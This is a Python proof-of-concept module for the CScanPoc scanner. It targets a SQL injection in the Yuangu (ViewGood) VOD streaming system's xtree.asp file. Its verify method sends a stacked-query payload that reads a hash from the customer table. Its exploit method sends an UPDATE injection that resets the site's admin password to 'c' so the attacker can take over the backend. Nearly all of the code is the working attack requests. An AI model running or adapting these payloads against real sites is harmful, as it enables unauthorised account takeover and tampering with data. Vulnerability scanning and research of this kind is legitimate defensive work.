# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'VIEWGOOD_0005'  # 平台漏洞编号，留空
    name = '远古VOD DB权限注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-07-07'  # 漏洞公布时间
    desc = '''
        漏洞文件webmedia/common/function/xtree.asp 存在着DB权限注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/176/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '远古流媒体系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c3fd1737-972a-4e52-b27a-792f75eda477'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/webmedia/common/function/xtree.asp?id=1;SELECT%20md5(c)%20from%20customer"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 直接修改admin密码为c,登录后台。
            payload = "/webmedia/common/function/xtree.asp?id=1;update%20customer%20set%20UserPass='9d37b73795649038'%20where%20UserName='admin'"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}，已修改admin账号密码为：c'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
